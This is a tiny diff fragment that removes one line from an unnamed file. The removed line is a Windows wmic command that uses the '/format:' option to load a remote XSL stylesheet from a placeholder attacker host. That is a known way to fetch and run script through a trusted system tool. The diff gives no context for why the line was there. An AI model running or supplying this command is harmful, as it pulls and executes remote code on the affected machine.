@@ -1,1 +1,0 @@
-wmic os get /format:http://attacker.com/evil.xsl
